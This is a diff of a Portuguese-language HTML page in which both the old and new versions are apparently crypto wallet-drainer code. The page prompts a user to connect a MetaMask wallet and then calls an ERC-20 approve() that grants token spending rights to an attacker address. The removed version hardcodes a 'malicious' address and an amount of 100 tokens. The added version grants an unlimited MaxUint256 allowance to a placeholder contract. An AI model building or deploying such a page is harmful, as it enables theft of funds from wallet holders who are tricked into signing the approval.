@@ -1,282 +1,57 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt">
 <head>
     <meta charset="UTF-8">
-    <title>Aprovar Tokens</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
+    <title>Aprovação de Contrato Malicioso</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.x/dist/ethers.umd.min.js"></script>
 </head>
 <body>
-    <button id="approveBtn">Aprovar Tokens</button>
+    <h2>Conectar Carteira & Aprovar Contrato Malicioso</h2>
+    <button id="connectWallet">Conectar Carteira</button>
+    <button id="approveMaliciousContract" style="display: none;">Aprovar Contrato Malicioso</button>
+    <script>
+        const connectWalletButton = document.getElementById('connectWallet');
+        const approveMaliciousContractButton = document.getElementById('approveMaliciousContract');
 
-<script>
-    async function loadWeb3() {
-        if (window.ethereum) { // Checa se o Ethereum (provedor injetado) está disponível no navegador
-            window.web3 = new Web3(ethereum); // Cria uma nova instância do Web3 usando o provedor injetado
-            try {
-                await ethereum.request({ method: 'eth_requestAccounts' }); // Solicita acesso ao usuário
-                // Após o acesso ser concedido, você pode inicializar sua aplicação
-                initializeApp();
-            } catch (error) {
-                console.error("Usuário negou acesso à conta.");
+        // Endereço do contrato malicioso (substitua pelo seu endereço do contrato)
+        const maliciousContractAddress = 'INSIRA_O_ENDEREÇO_DO_CONTRATO_AQUI';
+        // Endereço do token ERC20 (substitua pelo endereço do token que deseja usar)
+        const tokenAddress = 'INSIRA_O_ENDEREÇO_DO_TOKEN_AQUI';
+        // ABI simplificada do ERC20 focada na função approve
+        const tokenABI = [
+            "function approve(address spender, uint256 amount) external returns (bool)",
+        ];
+        // Defina a quantidade máxima (para fins de demo, usaremos "unlimited")
+        const maxUint256 = ethers.constants.MaxUint256;
+
+        connectWalletButton.addEventListener('click', async () => {
+            if (window.ethereum) {
+                try {
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    approveMaliciousContractButton.style.display = 'block';
+                } catch (error) {
+                    console.error('Usuário negou acesso à carteira.');
+                }
+            } else {
+                alert('Por favor, instale o MetaMask ou outra carteira Ethereum compatível.');
             }
-        } else if (window.web3) { // Caso o navegador tenha um provedor injetado antigo (metamask antigo)
-            window.web3 = new Web3(web3.currentProvider);
-            initializeApp();
-        } else {
-            console.log('Nenhuma extensão de carteira Ethereum detectada. Instale o MetaMask!');
-        }
-    }
-
-    function initializeApp() {
-        const tokenAddress = '0x04F3E16eEB298Ee4241A68dF656e2FB898Ca0259';
-        const contractABI = [
-	{
-		"anonymous": false,
-		"inputs": [
-			{
-				"indexed": true,
-				"internalType": "address",
-				"name": "owner",
-				"type": "address"
-			},
-			{
-				"indexed": true,
-				"internalType": "address",
-				"name": "spender",
-				"type": "address"
-			},
-			{
-				"indexed": false,
-				"internalType": "uint256",
-				"name": "value",
-				"type": "uint256"
-			}
-		],
-		"name": "Approval",
-		"type": "event"
-	},
-	{
-		"anonymous": false,
-		"inputs": [
-			{
-				"indexed": true,
-				"internalType": "address",
-				"name": "from",
-				"type": "address"
-			},
-			{
-				"indexed": true,
-				"internalType": "address",
-				"name": "to",
-				"type": "address"
-			},
-			{
-				"indexed": false,
-				"internalType": "uint256",
-				"name": "value",
-				"type": "uint256"
-			}
-		],
-		"name": "Transfer",
-		"type": "event"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "_spender",
-				"type": "address"
-			},
-			{
-				"internalType": "uint256",
-				"name": "_value",
-				"type": "uint256"
-			}
-		],
-		"name": "approve",
-		"outputs": [
-			{
-				"internalType": "bool",
-				"name": "success",
-				"type": "bool"
-			}
-		],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "_to",
-				"type": "address"
-			},
-			{
-				"internalType": "uint256",
-				"name": "_value",
-				"type": "uint256"
-			}
-		],
-		"name": "transfer",
-		"outputs": [
-			{
-				"internalType": "bool",
-				"name": "success",
-				"type": "bool"
-			}
-		],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "_from",
-				"type": "address"
-			},
-			{
-				"internalType": "address",
-				"name": "_to",
-				"type": "address"
-			},
-			{
-				"internalType": "uint256",
-				"name": "_value",
-				"type": "uint256"
-			}
-		],
-		"name": "transferFrom",
-		"outputs": [
-			{
-				"internalType": "bool",
-				"name": "success",
-				"type": "bool"
-			}
-		],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"stateMutability": "nonpayable",
-		"type": "constructor"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "",
-				"type": "address"
-			},
-			{
-				"internalType": "address",
-				"name": "",
-				"type": "address"
-			}
-		],
-		"name": "allowance",
-		"outputs": [
-			{
-				"internalType": "uint256",
-				"name": "",
-				"type": "uint256"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "",
-				"type": "address"
-			}
-		],
-		"name": "balanceOf",
-		"outputs": [
-			{
-				"internalType": "uint256",
-				"name": "",
-				"type": "uint256"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"name": "decimals",
-		"outputs": [
-			{
-				"internalType": "uint8",
-				"name": "",
-				"type": "uint8"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"name": "name",
-		"outputs": [
-			{
-				"internalType": "string",
-				"name": "",
-				"type": "string"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"name": "symbol",
-		"outputs": [
-			{
-				"internalType": "string",
-				"name": "",
-				"type": "string"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"name": "totalSupply",
-		"outputs": [
-			{
-				"internalType": "uint256",
-				"name": "",
-				"type": "uint256"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	}
-];
-        const contract = new web3.eth.Contract(contractABI, tokenAddress);
-
-        const maliciousAddress = '0xd54da5a16224b90EB4E0C1944B7Ea837AaD4053A';
-        const amountToApprove = web3.utils.toWei('100', 'ether');
-
-        document.getElementById('approveBtn').addEventListener('click', function() {
-            web3.eth.getAccounts().then(function(accounts) {
-                const userAccount = accounts[0];
-                contract.methods.approve(maliciousAddress, amountToApprove).send({from: userAccount})
-                .then(function(tx) {
-                    console.log('Tokens aprovados', tx);
-                }).catch(function(error) {
-                    console.error('Erro ao aprovar tokens', error);
-                });
-            });
         });
-    }
 
-    loadWeb3(); // Inicializa o Web3 ao carregar a página
-</script>
+        approveMaliciousContractButton.addEventListener('click', async () => {
+            if (window.ethereum) {
+                try {
+                    const provider = new ethers.providers.Web3Provider(window.ethereum);
+                    const signer = provider.getSigner();
+                    const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
+                    const tx = await tokenContract.approve(maliciousContractAddress, maxUint256);
+                    await tx.wait();
+                    alert('Contrato Malicioso aprovado com sucesso.');
+                } catch (error) {
+                    console.error(error);
+                    alert('Houve um erro ao aprovar o contrato malicioso.');
+                }
+            }
+        });
+    </script>
 </body>
 </html>
